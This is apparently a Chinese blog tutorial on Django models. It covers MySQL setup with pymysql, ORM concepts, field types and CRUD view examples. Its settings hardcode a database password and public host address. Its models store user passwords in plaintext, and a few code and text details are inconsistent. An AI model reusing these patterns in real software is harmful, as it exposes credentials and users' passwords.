<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line"> <span class="string">'django.middleware.security.SecurityMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.contrib.sessions.middleware.SessionMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.middleware.common.CommonMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.middleware.csrf.CsrfViewMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.contrib.auth.middleware.AuthenticationMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.contrib.messages.middleware.MessageMiddleware'</span>,</span><br><span class="line"> <span class="string">'django.middleware.clickjacking.XFrameOptionsMiddleware'</span>,</span><br><span class="line"> <span class="string">'App'</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>2、更改<code>DoModel/DoModel/settings.py</code>中的数据库为MySQL，下面会详细讲解如何更换数据库</p>
<p>3、在DoModel/urls.py中注册App的路由</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^app/'</span>,include(<span class="string">"App.urls"</span>))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>





<h1 id="更换数据库详解"><a href="#更换数据库详解" class="headerlink" title="更换数据库详解"></a>更换数据库详解</h1><p>在DoModel/setting.py*中修改DATABASES设置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'model3'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'niki'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'123456'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'121.36.70.55'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1、在MySQL上创建数据库model3, <code>create database model3;</code></p>
<p>2、添加数据库</p>
<img src="https://i.loli.net/2020/03/28/kFOEglnX6qjv752.png" alt="django(2) - 1" style="zoom:33%;" />


<p>3、下载驱动</p>
<img src="https://i.loli.net/2020/03/28/ZNeuG9t8Xd6WSCJ.png" alt="django(2) - 1.1" style="zoom:33%;" />

<p>4、 安装数据库驱动</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br><span class="line">pip install pymysql -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>



<p>5、伪装驱动</p>
<p>因为Django是不认pymysql的，所以需要伪装成MySQL_db</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HelloDjango/__init__.py</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>



<p>6、执行迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>可以看到Student表迁移成功：</p>
<img src="https://i.loli.net/2020/03/28/bPALwCZhTeOV8j3.png" alt="django(2) - 1.2" style="zoom:33%;" />




<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul>
<li>开发环境 Windows10</li>
<li>Python==3.5.2</li>
<li>django=1.11.7</li>
</ul>
<h2 id="MTV-MVC"><a href="#MTV-MVC" class="headerlink" title="MTV/MVC"></a>MTV/MVC</h2><p>MVC：（Model 、View、Controller）</p>
<ul>
<li><p>Model：用于封装与应用程序的业务逻辑相关的数据及对数据的处理方法，是web应用程序中用于处理应用程序的数据逻辑部分，Model通常只提供功能性的接口，通过这些接口可以获取Model的所有功能</p>
</li>
<li><p>View：负责数据的呈现，View对用户直接输出</p>
</li>
<li><p>Controller：负责从用户端收集用户输入，主要处理用户的交互</p>
</li>
</ul>
<p>MTV是从MVC演化而来，本质上和MVC一样，只是名字改了：</p>
<p>MTV：（Model、Template、View）</p>
<ul>
<li><p>Model：负责业务对象和数据库对象</p>
</li>
<li><p>View：负责业务逻辑，并在适当的时候调用Module 和 Template</p>
</li>
<li><p>Template：负责把页面展示给用户</p>
</li>
</ul>
<p>在Django中，还有url，主要用来将一个个URL页面请求分发给不同的view进行处理，View再调用相应的Model和Template。</p>
<p><img src="https://i.loli.net/2020/03/28/F9TZ12SaP6jlCYM.png" alt="django(二) - 3.png"></p>
<h2 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h2><p>ORM（Object Relation Mapping） 对象关系映射，就是把数据库也看作是一个对象，将数据库的属性映射到对象的属性和方法，目的是为了将业务逻辑和SQL语句进行解耦合：</p>
<ul>
<li>数据库的表（table） –&gt; 类（class）</li>
<li>记录（record，行数据）–&gt; 对象（object）</li>
<li>字段（field）–&gt; 对象的属性（attribute）</li>
</ul>
<p>ORM 使用对象，封装了数据库操作，因此可以不碰 SQL 语言。开发者只使用面向对象编程，与数据对象直接交互，不用关心底层数据库。</p>
<p>下面一段代码就是创建了两张表，Grade表的字段是g_grade、Student表的字段是s_name、s_password和s_grade。</p>
<p>可以看到，数据库的表对应了面向对象的类，且必须继承自models.Model这个类；字段则是对应了面向对象的属性。</p>
<p><em>/DoModel/App/models.py</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grade</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    g_grade = models.CharField(max_length=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_password = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_grade = models.ForeignKey(Grade)</span><br></pre></td></tr></table></figure>

<p>连接数据库</p>
<p><img src="https://i.loli.net/2020/03/28/mQ3aNuTwKHdA5IJ.png" alt="django(二）- 3.5.png"></p>
<p>映射到库中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations # 生成迁移文件</span><br><span class="line">python manage.py migrate   # 执行迁移</span><br></pre></td></tr></table></figure>



<p>刷新数据库就可以看到App_Student和App_Grade两张表了。查看表的定义：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- auto-generated definition</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> App_student</span><br><span class="line">(</span><br><span class="line">  	<span class="keyword">id</span>         <span class="built_in">int</span> auto_increment</span><br><span class="line">    primary <span class="keyword">key</span>,</span><br><span class="line">  	s_name     <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  	s_password <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  	s_grade_id <span class="built_in">int</span>         <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  	<span class="keyword">constraint</span> App_student_s_grade_id_797e4cc7_fk_App_grade_id</span><br><span class="line">    <span class="keyword">foreign</span> <span class="keyword">key</span> (s_grade_id) <span class="keyword">references</span> App_grade (<span class="keyword">id</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- auto-generated definition</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> App_grade</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">id</span>      <span class="built_in">int</span> auto_increment</span><br><span class="line">    primary <span class="keyword">key</span>,</span><br><span class="line">  	g_grade <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>





<h2 id="定义字段"><a href="#定义字段" class="headerlink" title="定义字段"></a>定义字段</h2><p>字段名不允许使用下划线，因为查询条件需要用到下划线</p>
<h3 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h3><table>
<thead>
<tr>
<th>字段类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>AutoField</td>
<td>一个根据实际ID自动增长的IntegerField，通常不指定如果不指定，一个主键字段将自动添加到模型中</td>
</tr>
<tr>
<td>CharField</td>
<td>字符串，默认的表单样式是 TextInput</td>
</tr>
<tr>
<td>TextField</td>
<td>大文本字段，一般超过4000使用，默认的表单控件是Textarea</td>
</tr>
<tr>
<td>IntegerField</td>
<td>整数</td>
</tr>
<tr>
<td>DecimalField</td>
<td>使用python的Decimal实例表示的十进制浮点数</td>
</tr>
<tr>
<td>FloatField</td>
<td>用Python的float实例来表示的浮点数</td>
</tr>
<tr>
<td>BooleanField</td>
<td>true/false 字段，此字段的默认表单控制是CheckboxInput，MySQL不支持Bool值，所以ORM会把布尔值转换为tinyint(1)类型</td>
</tr>
<tr>
<td>NullBooleanField</td>
<td>支持null、true、false三种值</td>
</tr>
<tr>
<td>DateField(auto_now=False, auto_now_add=False)</td>
<td>使用Python的datetime.date实例表示的日期</td>
</tr>
<tr>
<td>TimeField</td>
<td>使用Python的datetime.time实例表示的时间，参数同DateField</td>
</tr>
<tr>
<td>DateTimeField</td>
<td>使用Python的datetime.datetime实例表示的日期和时间，参数同DateField，示例：.o_time = modes.DataTimeField(auto_now_add=True)</td>
</tr>
<tr>
<td>FileField</td>
<td>一个上传文件的字段</td>
</tr>
<tr>
<td>ImageField</td>
<td>继承了FileField的所有属性和方法，但对上传的对象进行校验，确保它是个有效的image</td>
</tr>
</tbody></table>
<pre><code>DateField参数说明
    DateField.auto_now每次保存对象时，自动设置该字段为当前时间，用于&quot;最后一次修改&quot;的时间戳，它总是使用当前日期，默认为false
    DateField.auto_now_add
    1、当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为false
    2、说明
      该字段默认对应的表单控件是一个TextInput. 在管理员站点添加了一个JavaScript写的日历控件，和一个“Today&quot;的快捷按钮，包含了一个额外的invalid_date错误消息键
    3、注意
      auto_now_add, auto_now, and default 这些设置是相互排斥的，他们之间的任何组合将会发生错误的结果</code></pre><h3 id="字段约束"><a href="#字段约束" class="headerlink" title="字段约束"></a>字段约束</h3><table>
<thead>
<tr>
<th>字段约束</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>null</td>
<td>如果为True，Django 将空值以NULL 存储到数据库中，默认值是 False</td>
</tr>
<tr>
<td>blank</td>
<td>如果为True，则该字段允许为空白，默认值是 False，null是数据库范畴的概念，blank是表单验证证范畴的</td>
</tr>
<tr>
<td>db_column</td>
<td>字段的名称，如果未指定，则使用属性的名称</td>
</tr>
<tr>
<td>db_index</td>
<td>若值为 True, 则在表中会为此字段创建索引</td>
</tr>
<tr>
<td>default</td>
<td>默认值</td>
</tr>
<tr>
<td>primary_key</td>
<td>若为 True, 则该字段会成为模型的主键字段</td>
</tr>
<tr>
<td>unique</td>
<td>如果为 True, 这个字段在表中必须有唯一值</td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="comment"># max_length: 最大长度</span></span><br><span class="line">    <span class="comment"># unqiue: 唯一性</span></span><br><span class="line">    <span class="comment"># db_column: 自定义字段名，如果不定义，就直接使用s_name</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">16</span>,unique=<span class="literal">True</span>,db_column=<span class="string">'name'</span>)</span><br><span class="line">    s_age = models.IntegerField(default=<span class="number">18</span>,db_column=<span class="string">'age'</span>)</span><br><span class="line">    <span class="comment"># False表示男，True表示女</span></span><br><span class="line">    s_sex = models.BooleanField(default=<span class="literal">False</span>,db_column=<span class="string">'sex'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义表名</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'People'</span></span><br></pre></td></tr></table></figure>





<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>显性属性（开发者手动声明的属性），隐性属性（没有声明，父类中也不存在，动态产生出来的；如果开发者主动声明这些属性，隐性属性自己就不再产生了）</p>
<h1 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h1><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>事前准备：</p>
<p>1、在总的urls中注册App的urls</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^app/'</span>,include(<span class="string">"App.urls"</span>))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>2、创建并且编写App的urls.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^addStudent/'</span>, views.addStudent),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>3、创建views中的函数，用于添加学生数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Create your views here.</span><br><span class="line">def addStudent(request):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return HttpResponse(&quot;学生数据添加成功&quot;)</span><br></pre></td></tr></table></figure>

<p>4、手动创建几个Grade字段</p>
<p><img src="https://i.loli.net/2020/03/28/RH1NuUcz2hsofJa.png" alt="django(二)-4"></p>
<p>创建数据的几种方式</p>
<p>1、直接实例化对象设置属性</p>
<p>2、创建对象传入属性</p>
<p>3、使用Model.objects.create()</p>
<p>4、自己封装类方法创建</p>
<p>5、使用Manager()中封装方法创建</p>
<p>6、直接调用类方法添加数据</p>
<h3 id="1、直接实例化对象设置属性"><a href="#1、直接实例化对象设置属性" class="headerlink" title="1、直接实例化对象设置属性"></a>1、直接实例化对象设置属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student()</span><br><span class="line">    student.s_name = <span class="string">"Jack"</span></span><br><span class="line">    grade  = Grade.objects.get(pk=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"What is The Grade Type:"</span>,type(grade))  <span class="comment"># &lt;class 'App.models.Grade'&gt;</span></span><br><span class="line">    student.s_grade = grade <span class="comment"># 因为Student和Grade进行了外键关联，这里需要传入的是一个Grade的示例，不然会报错</span></span><br><span class="line">    student.s_password = <span class="string">"123456789"</span></span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"学生数据添加成功1"</span>)</span><br></pre></td></tr></table></figure>

<p>之后在Student表中就会多出一行数据了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [model3]&gt; select * <span class="keyword">from</span> App_student;</span><br><span class="line">+----+--------+------------+------------+</span><br><span class="line">| id | s_name | s_password | s_grade_id |</span><br><span class="line">+----+--------+------------+------------+</span><br><span class="line">|  <span class="number">1</span> | Jack   | <span class="number">123456789</span>  |          <span class="number">1</span> |</span><br><span class="line">+----+--------+------------+------------+</span><br></pre></td></tr></table></figure>



<h3 id="2、创建对象传入属性"><a href="#2、创建对象传入属性" class="headerlink" title="2、创建对象传入属性"></a>2、创建对象传入属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    grade = Grade.objects.get(pk=<span class="number">3</span>)</span><br><span class="line">    student = Student(s_name=<span class="string">'Rose'</span>,s_password=<span class="string">'abcdefg'</span>,s_grade=grade)</span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"学生数据添加成功2"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="3、使用Model-objects-create"><a href="#3、使用Model-objects-create" class="headerlink" title="3、使用Model.objects.create()"></a>3、使用Model.objects.create()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    grade = Grade.objects.get(pk=<span class="number">2</span>)</span><br><span class="line">    student = Student.objects.create(s_name=<span class="string">'Niki'</span>,s_password=<span class="string">'987654321'</span>,s_grade=grade)</span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"学生数据添加成功3"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="4、自己封装类方法创建"><a href="#4、自己封装类方法创建" class="headerlink" title="4、自己封装类方法创建"></a>4、自己封装类方法创建</h3><p>封装自己的类方法，可以添加默认值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_password = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_grade = models.ForeignKey(Grade)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(cls,s_name,s_grade,s_password=<span class="string">'PASWD'</span>)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cls(s_name=s_name,s_password=s_password,s_grade=s_grade)</span><br></pre></td></tr></table></figure>



<p>调用自己封装的类方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    grade = Grade.objects.get(pk=<span class="number">2</span>)</span><br><span class="line">    student = Student.objects.create(s_name=<span class="string">'Bool'</span>,s_password=<span class="string">'poiuytq'</span>,s_grade=grade)</span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"学生数据添加成功4"</span>)</span><br></pre></td></tr></table></figure>





<h3 id="5、使用Manager-中封装方法创建"><a href="#5、使用Manager-中封装方法创建" class="headerlink" title="5、使用Manager()中封装方法创建"></a>5、使用Manager()中封装方法创建</h3><p>在Models中定义Manager()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_password = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_grade = models.ForeignKey(Grade)</span><br><span class="line">	<span class="comment"># 多出来这1行，之后调用的时候可以写Student.s_m ，而不是Student.object </span></span><br><span class="line">    s_m = models.Manager()</span><br></pre></td></tr></table></figure>



<p>在views中调用Manager()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    grade = Grade.objects.get(pk=<span class="number">2</span>)</span><br><span class="line">    student = Student.s_m.create(s_name=<span class="string">'ZJ'</span>,s_password=<span class="string">'ILKEY'</span>,s_grade=grade)</span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"学生数据添加成功5"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="6、直接调用类方法添加数据"><a href="#6、直接调用类方法添加数据" class="headerlink" title="6、直接调用类方法添加数据"></a>6、直接调用类方法添加数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person = Person.create(<span class="string">'Neo'</span>,<span class="number">18</span>)</span><br><span class="line">person.save()</span><br></pre></td></tr></table></figure>



<h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><p>删除是基于查询的，把查询到的结果进行删除，这里删除的是主键为2的，因为刚刚jack插入了两次，重复了，所以删了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.get(pk=<span class="number">2</span>)</span><br><span class="line">    student.delete()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"删除成功！"</span>)</span><br></pre></td></tr></table></figure>



<h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><p>修改是基于查询的，修改后保存。</p>
<p>此时的数据库表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [model3]&gt; select * <span class="keyword">from</span> App_student;</span><br><span class="line">+----+--------+------------+------------+</span><br><span class="line">| id | s_name | s_password | s_grade_id |</span><br><span class="line">+----+--------+------------+------------+</span><br><span class="line">|  <span class="number">1</span> | Jack   | <span class="number">123456789</span>  |          <span class="number">1</span> |</span><br><span class="line">|  <span class="number">3</span> | Niki   | <span class="number">987654321</span>  |          <span class="number">1</span> |</span><br><span class="line">|  <span class="number">4</span> | Rose   | abcdefg    |          <span class="number">3</span> |</span><br><span class="line">|  <span class="number">5</span> | Bool   | poiuytq    |          <span class="number">2</span> |</span><br><span class="line">|  <span class="number">6</span> | ZJ     | ILKEY      |          <span class="number">2</span> |</span><br><span class="line">+----+--------+------------+------------+</span><br><span class="line"><span class="number">5</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<p>我们把Bool用户的ZJ用户的Password修改为：oiuytre</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.get(s_name=<span class="string">'ZJ'</span>)</span><br><span class="line">    student.s_password = <span class="string">"oiuytre"</span></span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"修改成功！"</span>)</span><br></pre></td></tr></table></figure>



<h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>查询句柄objects，objects是Manager()的实例，操作都封装在了objects里面，如<code>Person.objects.all()</code>，如果不想使用object对象，可以重写Manager()方法，详情见<strong>增</strong>的第5点。    </p>
<p>object ——&gt; Manager ——&gt; BaseManager ——&gt; get_queryset</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span><span class="params">(BaseManager.from_queryset<span class="params">(QuerySet)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>BaseManager是个类，类下面有get_queryset方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_queryset</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns a new QuerySet object.  Subclasses can override this method to</span></span><br><span class="line"><span class="string">    easily customize the behavior of the Manager.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> self._queryset_class(model=self.model, using=self._db, hints=self._hints)</span><br></pre></td></tr></table></figure>



<p>Student.objects.all()方法是调用的get_queryset方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># We can't proxy this method through the `QuerySet` like we do for the</span></span><br><span class="line">    <span class="comment"># rest of the `QuerySet` methods. This is because `QuerySet.all()`</span></span><br><span class="line">    <span class="comment"># works by creating a "copy" of the current queryset and in making said</span></span><br><span class="line">    <span class="comment"># copy, all the cached `prefetch_related` lookups are lost. See the</span></span><br><span class="line">    <span class="comment"># implementation of `RelatedManager.get_queryset()` for a better</span></span><br><span class="line">    <span class="comment"># understanding of how this comes into play.</span></span><br><span class="line">    <span class="keyword">return</span> self.get_queryset()</span><br></pre></td></tr></table></figure>



<p>查询方法最后都会归结到get_queryset方法，所以只要对这个方法做封装，就可以实现定制化查询，比如逻辑删除后的查询。</p>
